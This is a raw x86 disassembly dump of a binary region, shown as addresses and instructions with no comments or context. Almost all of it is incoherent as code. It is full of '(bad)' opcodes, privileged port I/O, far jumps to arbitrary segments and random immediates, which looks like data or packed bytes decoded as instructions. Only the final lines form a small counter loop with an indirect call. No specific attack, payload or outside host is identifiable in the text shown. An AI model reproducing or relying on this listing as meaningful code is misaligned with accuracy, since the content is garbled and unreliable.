  416e4e:	leave  
  416e4f:	jg     0x416ec8
  416e51:	aas    
  416e52:	mov    ecx,0x34c8455a
  416e57:	or     BYTE PTR [ecx+ebx*1+0x6c4ac4bb],al
  416e5e:	test   al,0xf3
  416e60:	dec    eax
  416e61:	and    ebx,0x3ce68b31
  416e67:	(bad)  
  416e68:	or     DWORD PTR [edi],eax
  416e6a:	mov    eax,ds:0xce29946
  416e6f:	cdq    
  416e70:	mov    esi,0x5045de4f
  416e75:	sub    al,0x84
  416e77:	stc    
  416e78:	adc    eax,0xb061fb85
  416e7d:	ret    
  416e7e:	and    al,0xfe
  416e80:	pop    eax
  416e81:	adc    edx,edi
  416e83:	in     eax,dx
  416e84:	jns    0x416ee0
  416e86:	mov    WORD PTR [ebp+0x67936838],es
  416e8c:	sar    BYTE PTR ds:0xf067386c,0x89
  416e93:	or     al,0x1f
  416e95:	push   ebp
  416e96:	jno    0x416e1c
  416e98:	shr    esp,0x82
  416e9b:	mov    WORD PTR [edx-0x2],?
  416e9e:	or     eax,0x597a801c
  416ea3:	jp     0x416ec6
  416ea5:	xor    edx,edi
  416ea7:	sub    eax,0x61e4a9ce
  416eac:	mov    edi,0xa8101f11
  416eb1:	imul   esi,DWORD PTR [esi-0x2f0f703c],0x67
  416eb8:	and    al,0x93
  416eba:	call   0x1f41569
  416ebf:	push   edi
  416ec0:	adc    BYTE PTR [eax-0x4f],dh
  416ec3:	les    edx,FWORD PTR [eax-0x64]
  416ec6:	jle    0x416f2f
  416ec8:	and    esp,ecx
  416eca:	jp     0x416f3a
  416ecc:	ret    
  416ecd:	xor    cl,BYTE PTR [ecx]
  416ecf:	cmp    eax,0x81eb97c6
  416ed4:	cs pusha 
  416ed6:	je     0x416ef1
  416ed8:	sbb    eax,0x80fee219
  416edd:	shr    BYTE PTR ds:0xd7a9d632,0x34
  416ee4:	scas   eax,DWORD PTR es:[edi]
  416ee5:	pop    esi
  416ee6:	outs   dx,DWORD PTR ds:[esi]
  416ee7:	xor    al,0x34
  416ee9:	aaa    
  416eea:	(bad)  
  416eeb:	loopne 0x416ede
  416eed:	sahf   
  416eee:	mov    eax,ds:0xfa4364b3
  416ef3:	out    0xcc,eax
  416ef5:	mov    ds:0x569ab88a,eax
  416efa:	stos   BYTE PTR es:[edi],al
  416efb:	(bad)  
  416efc:	pop    ebp
  416efd:	fistp  WORD PTR [edi+ecx*2-0x43]
  416f01:	mov    cl,0x41
  416f03:	mov    al,0x20
  416f05:	sub    BYTE PTR [ebp-0xcca4b98],ch
  416f0b:	xchg   DWORD PTR [esi-0x51bb7cb],edi
  416f11:	mov    eax,0x33e4a893
  416f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f17:	xor    edi,DWORD PTR [eax-0x6bc55db0]
  416f1d:	cmp    edi,DWORD PTR [ecx]
  416f1f:	pop    ecx
  416f20:	mov    WORD PTR [ebp-0x39],cs
  416f23:	je     0x416efb
  416f25:	cmc    
  416f26:	dec    esp
  416f27:	sbb    al,0x65
  416f29:	scas   eax,DWORD PTR es:[edi]
  416f2a:	out    0xce,eax
  416f2c:	jg     0x416f43
  416f2e:	aaa    
  416f2f:	jecxz  0x416f75
  416f31:	fild   DWORD PTR [edx+ecx*8+0x1e10262e]
  416f38:	mov    bh,BYTE PTR [edi-0x3d240b06]
  416f3e:	adc    ebp,DWORD PTR [eax+0x3b0c1c47]
  416f44:	pop    ds
  416f45:	mov    esi,0x15fc7923
  416f4a:	popa   
  416f4b:	lock lock mov esp,0xf935384a
  416f52:	cdq    
  416f53:	fsub   DWORD PTR [edx+ebx*4+0x18c4fa25]
  416f5a:	clc    
  416f5b:	xor    ebx,DWORD PTR [esi-0x67f82b42]
  416f61:	data16 adc BYTE PTR [edi-0x78],ch
  416f65:	aas    
  416f66:	mov    edi,0xb8718736
  416f6b:	pop    esp
  416f6c:	jle    0x416f3d
  416f6e:	mov    dh,BYTE PTR [edi]
  416f70:	int3   
  416f71:	test   DWORD PTR [ecx+0x286216a6],esp
  416f77:	(bad)
  416f7b:	sbb    DWORD PTR [edi],ecx
  416f7d:	pop    ebx
  416f7e:	pop    ebp
  416f7f:	push   es
  416f80:	add    dl,BYTE PTR [edi]
  416f82:	xor    eax,0x53d6853e
  416f87:	and    eax,0xc141c842
  416f8c:	adc    eax,0xeb5759ff
  416f91:	arpl   di,bx
  416f93:	adc    eax,0x493399ec
  416f98:	xlat   BYTE PTR ds:[ebx]
  416f99:	mov    ah,0xa7
  416f9b:	mov    gs,ecx
  416f9d:	fs stos BYTE PTR es:[edi],al
  416f9f:	xchg   ebx,eax
  416fa0:	push   ecx
  416fa1:	and    esp,edx
  416fa3:	loop   0x416fa6
  416fa5:	mov    edx,0xdba8d57
  416faa:	ret    
  416fab:	test   BYTE PTR [eax+0x3e],dh
  416fae:	call   0x75b6:0x44b0796c
  416fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb6:	scas   al,BYTE PTR es:[edi]
  416fb7:	xor    eax,0x8699e7af
  416fbc:	push   ecx
  416fbd:	popf   
  416fbe:	in     eax,dx
  416fbf:	pop    edx
  416fc0:	call   0xd9f7:0x34bed773
  416fc7:	push   ebx
  416fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc9:	push   edx
  416fca:	xlat   BYTE PTR ds:[ebx]
  416fcb:	push   edx
  416fcc:	stc    
  416fcd:	std    
  416fce:	jmp    DWORD PTR [ecx+ecx*2+0x68]
  416fd2:	(bad)  [ebx+0x1d5e3cf5]
  416fd8:	inc    edx
  416fd9:	cdq    
  416fda:	jbe    0x416fec
  416fdc:	xchg   ebx,eax
  416fdd:	pop    esi
  416fde:	retf   0xa9f
  416fe1:	loop   0x416ff9
  416fe3:	mov    ss,WORD PTR [edi+0x57]
  416fe6:	sbb    esp,DWORD PTR [ecx-0x45]
  416fe9:	mov    ecx,0x901a39ec
  416fee:	sbb    ebx,ebx
  416ff0:	cs push 0x35f1cec5
  416ff6:	and    dl,BYTE PTR [ebp-0x6a769ff6]
  416ffc:	in     eax,dx
  416ffd:	mov    ch,0x92
  416fff:	cwde   
  417000:	mov    es,WORD PTR [edi]
  417002:	stos   BYTE PTR es:[edi],al
  417003:	imul   ecx,DWORD PTR [ebx+0x7b],0xffffffd1
  417007:	cdq    
  417008:	sahf   
  417009:	lea    ebp,[edx]
  41700b:	sub    eax,0x2a203cd7
  417010:	daa    
  417011:	jb     0x416fa7
  417013:	push   es
  417014:	dec    ebp
  417015:	aad    0x5d
  417017:	out    0x3,al
  417019:	bnd jl 0x417039
  41701c:	adc    eax,ecx
  41701e:	test   BYTE PTR [esi+0x3],ah
  417021:	pop    ebp
  417022:	fnsave fs:[edi-0x39b3975f]
  417029:	xor    ebp,edx
  41702b:	clc    
  41702c:	stc    
  41702d:	pop    edi
  41702e:	fs push ss
  417030:	mov    ds:0xc252cff,eax
  417035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417036:	cwde   
  417037:	xlat   BYTE PTR ds:[ebx]
  417038:	cmp    eax,0x7db53002
  41703d:	sbb    ecx,DWORD PTR [edx]
  41703f:	jo     0x417044
  417041:	int3   
  417042:	int3   
  417043:	icebp  
  417044:	icebp  
  417045:	push   cs
  417046:	out    0x42,eax
  417048:	jg     0x417054
  41704a:	cmp    BYTE PTR [ebp-0xc],cl
  41704d:	sub    al,0x9
  41704f:	and    BYTE PTR [ebp-0x5c39fce8],bh
  417055:	(bad)  
  417056:	jmp    0x417099
  417058:	add    cl,ch
  41705a:	mov    bl,0x2
  41705c:	add    BYTE PTR [eax],al
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x6442a245],edx
  41706d:	loop   0x4170b4
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417068
  417077:	mov    al,0xc9
  417079:	inc    eax
  41707a:	lea    ebp,[eax]
  41707c:	outs   dx,DWORD PTR ds:[esi]
  41707d:	outs   dx,BYTE PTR ds:[esi]
  41707e:	ja     0x4170fe
  417080:	ss std 
  417082:	or     al,BYTE PTR [ebx]
  417084:	mov    ds:0x15190fd6,eax
  417089:	loop   0x417036
  41708b:	mov    edi,0xac46bf81
  417090:	imul   ebp,DWORD PTR [esi],0xffffffd8
  417093:	les    eax,FWORD PTR [edx+0x2b]
  417096:	retf   
  417097:	int3   
  417098:	jmp    0x1875cb1d
  41709d:	push   ss
  41709e:	lock fnstcw WORD PTR [esi+ebx*1-0x5a]
  4170a3:	inc    ebp
  4170a4:	retf   
  4170a5:	dec    ecx
  4170a6:	jle    0x417068
  4170a8:	pop    es
  4170a9:	sub    esi,edi
  4170ab:	push   0xffffffb8
  4170ad:	jle    0x4170a2
  4170af:	xlat   BYTE PTR ds:[ebx]
  4170b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b1:	dec    esp
  4170b2:	jecxz  0x4170e0
  4170b4:	test   al,0xde
  4170b6:	xor    esp,edx
  4170b8:	add    eax,0x9b802bb5
  4170bd:	cmp    esi,edx
  4170bf:	jge    0x4170df
  4170c1:	xchg   ebx,eax
  4170c2:	aam    0xf
  4170c4:	mov    ds:0x66b22b39,eax
  4170c9:	stc    
  4170ca:	pop    ds
  4170cb:	int3   
  4170cc:	lods   eax,DWORD PTR ds:[esi]
  4170cd:	test   eax,0xd6899bd0
  4170d2:	pop    esi
  4170d3:	out    dx,al
  4170d4:	call   0x515da936
  4170d9:	aas    
  4170da:	pop    esp
  4170db:	ret    0x8601
  4170de:	mov    ds:0xcb0e2803,al
  4170e3:	xchg   edx,eax
  4170e4:	test   eax,0xcea1ac00
  4170e9:	scas   al,BYTE PTR es:[edi]
  4170ea:	mov    eax,ds:0xaca74dd4
  4170ef:	jns    0x4170c0
  4170f1:	jmp    FWORD PTR [edx]
  4170f3:	iret   
  4170f4:	pushf  
  4170f5:	and    al,0x9e
  4170f7:	outs   dx,DWORD PTR ds:[esi]
  4170f8:	jb     0x417146
  4170fa:	sbb    eax,0xbe3e1c5c
  4170ff:	pop    ss
  417100:	fwait
  417101:	mov    bh,0x5b
  417103:	and    eax,0x4dc23527
  417108:	fwait
  417109:	cmp    al,0x40
  41710b:	ret    0xdb7c
  41710e:	ins    DWORD PTR es:[edi],dx
  41710f:	dec    ebx
  417110:	repz lock dec ebp
  417113:	aad    0x69
  417115:	repnz adc eax,0xaf119d23
  41711b:	push   ds
  41711c:	pop    eax
  41711d:	adc    ah,dl
  41711f:	arpl   WORD PTR [ebp+ebp*8-0x35d45e6],ax
  417126:	add    eax,0x8935b14
  41712b:	fwait
  41712c:	std    
  41712d:	hlt    
  41712e:	xchg   edi,eax
  41712f:	iret   
  417130:	ret    
  417131:	push   0xffffff91
  417133:	dec    edx
  417134:	xchg   ebp,eax
  417135:	das    
  417136:	pop    ebx
  417137:	adc    BYTE PTR [eax],bh
  417139:	inc    eax
  41713a:	int    0x8f
  41713c:	sbb    DWORD PTR [eax-0x78e90836],ebp
  417142:	ret    
  417143:	add    BYTE PTR [esi-0x5f7e6b2d],0x82
  41714a:	loopne 0x417135
  41714c:	xor    BYTE PTR [ebp-0x29725309],ch
  417152:	pop    edi
  417153:	call   0x106a:0x3e9e39b9
  41715a:	sub    eax,0x28d24025
  41715f:	sar    BYTE PTR [ecx+edi*4],1
  417162:	mov    esp,0x9fd87d4f
  417167:	pop    DWORD PTR [edi]
  417169:	inc    ebp
  41716a:	dec    ecx
  41716b:	stos   BYTE PTR es:[edi],al
  41716c:	(bad)  
  41716d:	retf   0x9b23
  417170:	out    0xd4,eax
  417172:	imul   edi,esp,0x12823111
  417178:	adc    eax,0x9df02c8
  41717d:	fst    DWORD PTR [ebp-0x1e620733]
  417183:	inc    edx
  417184:	jecxz  0x4171a2
  417186:	test   al,0x15
  417188:	pop    ebx
  417189:	add    ebp,edi
  41718b:	(bad)  [eax]
  41718d:	loope  0x417141
  41718f:	fwait
  417190:	inc    ebp
  417191:	ins    BYTE PTR es:[edi],dx
  417192:	inc    esi
  417193:	repnz mov BYTE PTR [edi-0x7d],bl
  417197:	pop    ss
  417198:	mov    esi,DWORD PTR [ecx-0x20]
  41719b:	pop    ebp
  41719c:	stos   DWORD PTR es:[edi],eax
  41719d:	ja     0x417129
  41719f:	retf   
  4171a0:	ret    
  4171a1:	push   ebx
  4171a2:	lock adc DWORD PTR [edi+0x635be2d],edx
  4171a9:	mov    dl,0x48
  4171ab:	addps  xmm3,xmm6
  4171ae:	mov    WORD PTR [edi],cs
  4171b0:	lds    ebx,FWORD PTR [eax]
  4171b2:	xchg   ecx,eax
  4171b3:	and    al,0x3b
  4171b5:	clc    
  4171b6:	xchg   esi,eax
  4171b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b8:	aad    0x12
  4171ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171bb:	popf   
  4171bc:	sahf   
  4171bd:	xchg   edx,eax
  4171be:	xchg   ebx,eax
  4171bf:	scas   eax,DWORD PTR es:[edi]
  4171c0:	rcl    BYTE PTR [esi-0x66],1
  4171c3:	aad    0x46
  4171c5:	jl     0x41717f
  4171c7:	mov    ecx,0xae721aec
  4171cc:	shl    cl,0xb8
  4171cf:	sbb    esi,DWORD PTR [edi+edx*2-0x2442818]
  4171d6:	stc    
  4171d7:	dec    esi
  4171d8:	stos   DWORD PTR es:[edi],eax
  4171d9:	enter  0x2574,0xc4
  4171dd:	loope  0x41721a
  4171df:	in     eax,dx
  4171e0:	push   esi
  4171e1:	pop    ecx
  4171e2:	fld    st(3)
  4171e4:	shr    DWORD PTR [ecx-0x66],0x1d
  4171e8:	jge    0x417242
  4171ea:	mov    WORD PTR [edx],ss
  4171ec:	jbe    0x4171ed
  4171ee:	stos   DWORD PTR es:[edi],eax
  4171ef:	jge    0x4171f0
  4171f1:	aam    0xd0
  4171f3:	pop    ds
  4171f4:	pusha  
  4171f5:	sub    al,0xab
  4171f7:	shl    BYTE PTR [eax+0x41],1
  4171fa:	push   ds
  4171fb:	or     al,0x1
  4171fd:	pop    ds
  4171fe:	(bad)  
  4171ff:	xchg   esi,eax
  417200:	push   edx
  417201:	aaa    
  417202:	cld    
  417203:	and    al,0x96
  417205:	pusha  
  417206:	ret    0x47a5
  417209:	jo     0x417253
  41720b:	mov    bl,BYTE PTR [eax-0x220e3b5e]
  417211:	mov    dh,BYTE PTR [edx]
  417213:	cmp    eax,0x4ecd2b7b
  417218:	xor    cl,cl
  41721a:	adc    eax,0xaf2d5472
  41721f:	push   ebp
  417220:	or     DWORD PTR [ecx],0x5f28314b
  417226:	imul   ecx,DWORD PTR [edi-0x40],0x526fd4af
  41722d:	scas   eax,DWORD PTR es:[edi]
  41722e:	pop    es
  41722f:	adc    DWORD PTR [edx+0x18cfa5d6],ecx
  417235:	les    ebp,FWORD PTR [ebp+0x3a]
  417238:	call   0x7269:0xb4d62d9b
  41723f:	hlt    
  417240:	ins    BYTE PTR es:[edi],dx
  417241:	jbe    0x41725a
  417243:	adc    DWORD PTR [eax-0x5ed50b16],edx
  417249:	mov    bl,0x1a
  41724b:	cmp    al,0xa5
  41724d:	push   ebx
  41724e:	call   0x186ea0ad
  417253:	xor    al,BYTE PTR [ebp-0x4c203c30]
  417259:	add    eax,0x8ad9a11d
  41725f:	adc    ecx,DWORD PTR [ebx-0x1]
  417262:	pop    esp
  417263:	jb     0x41724b
  417265:	nop
  417266:	ficom  WORD PTR [esi]
  417268:	data16 sbb al,0x53
  41726b:	mov    edi,0x56c2d6e4
  417270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417271:	pushf  
  417272:	cmp    al,0x9c
  417274:	loopne 0x417279
  417276:	leave  
  417277:	cmp    esi,DWORD PTR [eax-0x49]
  41727a:	enter  0x9438,0x0
  41727e:	outs   dx,BYTE PTR ds:[esi]
  41727f:	pop    esi
  417280:	pop    ds
  417281:	dec    edx
  417282:	jbe    0x417278
  417284:	pop    edi
  417285:	cli    
  417286:	xor    bh,BYTE PTR [edx]
  417288:	out    dx,al
  417289:	out    dx,eax
  41728a:	sbb    DWORD PTR [eax-0x5b493dd3],0x7234084a
  417294:	or     al,0x31
  417296:	sub    BYTE PTR [esi+edi*2-0xe],bl
  41729a:	fmul   st(4),st
  41729c:	(bad)  
  41729e:	pop    ebp
  41729f:	cs lock pop ebp
  4172a2:	outs   dx,BYTE PTR ds:[esi]
  4172a3:	cs push edx
  4172a5:	fndisi(8087 only) 
  4172a7:	stos   BYTE PTR es:[edi],al
  4172a8:	je     0x417278
  4172aa:	adc    ch,BYTE PTR [esi-0x82aef91]
  4172b0:	mov    esp,0x76f3cefe
  4172b5:	mov    BYTE PTR [edx+0x2],0x8f
  4172b9:	cs ret 0xa578
  4172bd:	aas    
  4172be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172bf:	lds    edx,FWORD PTR [ebx]
  4172c1:	jmp    0x417298
  4172c3:	sub    ax,0x65a5
  4172c7:	lods   al,BYTE PTR ds:[esi]
  4172c8:	loop   0x417271
  4172ca:	push   eax
  4172cb:	fld1   
  4172cd:	pop    edx
  4172ce:	popa   
  4172cf:	adc    al,0x3e
  4172d1:	xchg   esp,eax
  4172d2:	out    dx,eax
  4172d3:	pop    ebp
  4172d4:	adc    DWORD PTR [esi+0x18ca9211],edx
  4172da:	mov    DWORD PTR [esi-0x6ce25528],esp
  4172e0:	ret    
  4172e1:	enter  0xe761,0x8b
  4172e5:	sub    esp,DWORD PTR [eax+0x17912c3a]
  4172eb:	dec    esp
  4172ec:	xor    BYTE PTR [esi-0x166d4421],0x26
  4172f3:	in     al,0xed
  4172f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f6:	cmp    DWORD PTR [esi+0x5c],0x96ed8250
  4172fd:	and    ebp,DWORD PTR [edi]
  4172ff:	mov    ecx,0x26f13b5b
  417304:	push   ds
  417305:	repnz or eax,0x5676a45d
  41730b:	and    al,0x51
  41730d:	push   ss
  41730e:	jg     0x41733e
  417310:	jmp    0xfc75:0xfff875ff
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	sar    al,1
  417334:	cmp    DWORD PTR [ecx],esi
  417336:	jl     0x41731a
  417338:	sub    BYTE PTR [edi+0x78],bh
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4173bc
  417340:	(bad)  
  417342:	sub    al,0x45
  417344:	and    DWORD PTR [ebx+0x53c01f28],eax
  41734a:	lods   eax,DWORD PTR ds:[esi]
  41734b:	leave  
  41734c:	add    eax,DWORD PTR [esi-0x7e05b282]
  417352:	dec    edi
  417353:	popf   
  417354:	mov    esp,0xcbe978aa
  417359:	xchg   ecx,eax
  41735a:	test   al,0xbb
  41735c:	ja     0x4173cf
  41735e:	adc    eax,0xa40faeb9
  417363:	jle    0x417350
  417365:	aaa    
  417366:	jne    0x1b8aca5c
  41736c:	and    eax,0x802d1164
  417371:	sbb    eax,DWORD PTR [edx+0x65cecd0b]
  417377:	mov    dl,0x6e
  417379:	push   ebp
  41737a:	test   DWORD PTR [eax-0x14],edx
  41737d:	mov    DWORD PTR [ebx+0x1b],ebx
  417380:	inc    BYTE PTR [ecx+edi*2]
  417383:	sbb    eax,0xccd9068
  417388:	jmp    0x15e5:0xfab3d1e9
  41738f:	stos   DWORD PTR es:[edi],eax
  417390:	pop    ds
  417391:	mov    al,BYTE PTR [ecx-0x144025ad]
  417397:	pop    ebx
  417398:	pop    ds
  417399:	xor    cl,BYTE PTR [ebx]
  41739b:	mov    dh,0xd2
  41739d:	hlt    
  41739e:	arpl   WORD PTR [eax],ax
  4173a0:	jmp    0xaa331d38
  4173a5:	mov    ch,0x48
  4173a7:	push   eax
  4173a8:	iret   
  4173a9:	idiv   BYTE PTR [ebp+0x7c9b01de]
  4173af:	cmp    esi,DWORD PTR [esi-0x6d]
  4173b2:	int3   
  4173b3:	pop    ds
  4173b4:	inc    edi
  4173b5:	icebp  
  4173b6:	leave  
  4173b7:	or     BYTE PTR [ebp-0x294974c9],0x5d
  4173be:	adc    DWORD PTR [edx+0x43f005cc],ecx
  4173c4:	add    al,BYTE PTR [edx-0x6ed3d0ed]
  4173ca:	push   0xfc64f1be
  4173cf:	sub    bl,BYTE PTR [ecx+0x4e]
  4173d2:	jns    0x4173e8
  4173d4:	push   ds
  4173d5:	loope  0x4173e7
  4173d7:	jl     0x417363
  4173d9:	retf   
  4173da:	xor    esi,esi
  4173dc:	outs   dx,DWORD PTR ds:[esi]
  4173dd:	adc    BYTE PTR [ebx],dh
  4173df:	cmp    esi,0x9f1bc0e9
  4173e5:	cmp    al,0x17
  4173e7:	fidiv  DWORD PTR ds:0xaf51a230
  4173ed:	popf   
  4173ee:	stos   DWORD PTR es:[edi],eax
  4173ef:	and    al,0xb9
  4173f1:	pop    es
  4173f2:	test   cl,dl
  4173f4:	cmp    al,BYTE PTR [edx]
  4173f6:	adc    DWORD PTR [ebx-0x6b],esp
  4173f9:	mov    eax,esi
  4173fb:	les    eax,FWORD PTR [ebp-0x12]
  4173fe:	shl    cl,cl
  417400:	xchg   ebx,eax
  417401:	sub    ebp,ebx
  417403:	inc    ecx
  417404:	in     al,0x1e
  417406:	mov    eax,0xe0f88c64
  41740b:	mov    al,ds:0xc36224f8
  417411:	jns    0x417476
  417413:	jmp    DWORD PTR [ecx]
  417415:	sub    bl,BYTE PTR [ebp+0x1f4c8dab]
  41741b:	jb     0x4173b2
  41741d:	pop    esp
  41741e:	xchg   edi,eax
  41741f:	dec    ecx
  417420:	xor    al,0x8f
  417422:	(bad)  [ebx]
  417424:	push   ss
  417425:	ss sub edx,esi
  417428:	das    
  417429:	push   edx
  41742a:	jp     0x4174ab
  41742c:	loopne 0x417467
  41742e:	or     al,BYTE PTR [ecx]
  417430:	pop    ss
  417431:	add    ecx,DWORD PTR ds:0x40558166
  417437:	jg     0x41743f
  417439:	mov    eax,ds:0x287696b1
  41743e:	and    BYTE PTR [ecx],dl
  417440:	adc    bh,bh
  417442:	and    eax,0x5644ebf6
  417447:	push   eax
  417448:	lods   eax,DWORD PTR ds:[esi]
  417449:	test   al,0x93
  41744b:	cmp    ebp,DWORD PTR [edi-0x4b]
  41744e:	stos   DWORD PTR es:[edi],eax
  41744f:	jge    0x4173fd
  417451:	(bad)  
  417452:	or     eax,0x20a522d8
  417457:	mov    bl,BYTE PTR [ebp-0x40]
  41745a:	fs imul ebx,edx,0x6c269a2b
  417461:	jmp    0xc810d39a
  417466:	js     0x417464
  417468:	mov    esi,ebp
  41746a:	xor    al,0x1c
  41746c:	in     al,0x7c
  41746e:	out    0xea,eax
  417470:	xchg   BYTE PTR [eax],bh
  417472:	inc    edi
  417473:	and    eax,edx
  417475:	add    al,0xa6
  417477:	je     0x417404
  417479:	jno    0x41748c
  41747b:	lds    di,DWORD PTR [ebp+0x23]
  41747f:	push   0x50
  417481:	out    dx,eax
  417482:	mov    BYTE PTR [eax-0x4c],ch
  417485:	or     BYTE PTR [eax],al
  417487:	or     al,0x43
  417489:	push   edi
  41748a:	xchg   ecx,eax
  41748b:	adc    al,0x93
  41748d:	scas   al,BYTE PTR es:[edi]
  41748e:	mov    ds:0xacfb2bf3,al
  417493:	xor    eax,DWORD PTR ds:0x613c22a4
  417499:	xor    al,0x7a
  41749b:	or     edx,DWORD PTR [ecx-0x7054eea4]
  4174a1:	jne    0x41747f
  4174a3:	loope  0x4174a8
  4174a5:	sub    eax,0x287b8500
  4174aa:	and    eax,0x626bc182
  4174af:	mov    esp,0x6727f177
  4174b4:	cmp    eax,0x5fef579a
  4174b9:	mov    ecx,0x75d44a5a
  4174be:	inc    ebp
  4174bf:	push   edi
  4174c0:	jnp    0x4174a7
  4174c2:	scas   eax,DWORD PTR es:[edi]
  4174c3:	adc    eax,0x72fe7ef9
  4174c8:	test   BYTE PTR [ecx+esi*8+0x1d],ah
  4174cc:	inc    ebx
  4174cd:	rcr    DWORD PTR [edi],1
  4174cf:	mov    ch,0x80
  4174d1:	aam    0x21
  4174d3:	jp     0x4174df
  4174d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174d6:	or     eax,0xe1008db3
  4174db:	aas    
  4174dc:	rol    DWORD PTR [ebx+esi*4+0x61c6da03],cl
  4174e3:	xchg   DWORD PTR [ecx+0x38],ebp
  4174e6:	jnp    0x4174d0
  4174e8:	or     DWORD PTR [edx],esi
  4174ea:	and    al,0xc4
  4174ed:	mov    DWORD PTR [ebp+ecx*1+0x52],ecx
  4174f1:	adc    BYTE PTR [eax+esi*8],dh
  4174f4:	push   edi
  4174f5:	inc    edi
  4174f6:	dec    edx
  4174f7:	(bad)  
  4174f8:	xchg   esp,eax
  4174f9:	jo     0x4174be
  4174fb:	test   eax,0xc16dce70
  417500:	xchg   ebp,eax
  417501:	adc    eax,0xe594a3a0
  417506:	loope  0x4174ac
  417508:	mov    esi,0x1273f5c0
  41750d:	inc    esi
  41750e:	xor    edx,DWORD PTR [eax+ecx*2+0x6b]
  417512:	imul   BYTE PTR [edi-0x67]
  417515:	adc    ecx,DWORD PTR ds:0xc541d536
  41751b:	xchg   esi,eax
  41751c:	lea    ebp,[eax+edi*1+0x6cc21581]
  417523:	sbb    ah,BYTE PTR [edi-0x49]
  417526:	or     al,0x10
  417528:	adc    eax,0x6ccfd5bd
  41752d:	jge    0x41751d
  41752f:	ret    0x19ef
  417532:	cmc    
  417533:	pmaxub mm6,QWORD PTR [ebp+0xb]
  417537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417538:	add    ebp,DWORD PTR [ebp-0x52]
  41753b:	or     ch,BYTE PTR [eax-0x7d]
  41753e:	out    dx,eax
  41753f:	mov    eax,ds:0x731b909d
  417544:	mov    eax,0xdb8da321
  417549:	inc    ebx
  41754a:	shl    DWORD PTR [ebp+0x48],1
  41754d:	cs or  al,0xf6
  417550:	jmp    0xde5e9b0
  417555:	push   ss
  417556:	dec    ebp
  417557:	inc    edi
  417558:	push   edi
  417559:	cmc    
  41755a:	xchg   BYTE PTR [esi],dl
  41755c:	sub    al,0x4a
  41755e:	dec    esp
  41755f:	std    
  417560:	fucomip st,st(5)
  417562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417563:	cli    
  417564:	(bad)  
  417565:	in     al,dx
  417566:	test   DWORD PTR [ecx],ebp
  417568:	cmc    
  417569:	cmp    esi,ecx
  41756b:	pusha  
  41756c:	(bad)  
  41756d:	push   0xc235f6a7
  417572:	icebp  
  417573:	xchg   edx,eax
  417574:	pop    eax
  417575:	cmp    DWORD PTR [edi+0x55],edx
  417578:	push   ds
  417579:	mov    ax,0x6127
  41757d:	push   ds
  41757e:	das    
  41757f:	stos   BYTE PTR es:[edi],al
  417580:	(bad)  
  417581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417582:	pop    esi
  417583:	cmc    
  417584:	les    ebx,FWORD PTR [eax+0x37]
  417587:	dec    BYTE PTR [esi-0x3a]
  41758a:	pushf  
  41758b:	push   ss
  41758c:	neg    BYTE PTR [esi]
  41758e:	jbe    0x4175db
  417590:	pop    esi
  417591:	push   eax
  417592:	pop    esi
  417593:	fidiv  WORD PTR [eax]
  417595:	mov    esp,0xde937cea
  41759a:	jmp    0xf19f:0xc75a7a1f
  4175a1:	cmc    
  4175a2:	mov    ebp,0xdf338377
  4175a7:	add    DWORD PTR [ebp+ebp*2-0x4d45ff4f],ebp
  4175ae:	fdivr  DWORD PTR [ecx+0x19]
  4175b1:	pushf  
  4175b2:	sub    ecx,eax
  4175b4:	and    dh,cl
  4175b6:	mov    eax,ds:0x59d7ef5b
  4175bb:	mov    al,0xb4
  4175be:	inc    ebx
  4175bf:	stos   BYTE PTR es:[edi],al
  4175c0:	stc    
  4175c1:	dec    esp
  4175c2:	mov    WORD PTR [esi],fs
  4175c4:	je     0x4175e0
  4175c6:	ror    DWORD PTR [ebp-0x1f],cl
  4175c9:	jl     0x417630
  4175cb:	jmp    0x2b0179e8
  4175d0:	iret   
  4175d1:	pushw  es
  4175d3:	or     DWORD PTR [edx-0x2],esi
  4175d6:	neg    DWORD PTR [edi]
  4175d8:	push   ss
  4175d9:	rol    DWORD PTR [ebx],cl
  4175db:	(bad)  
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
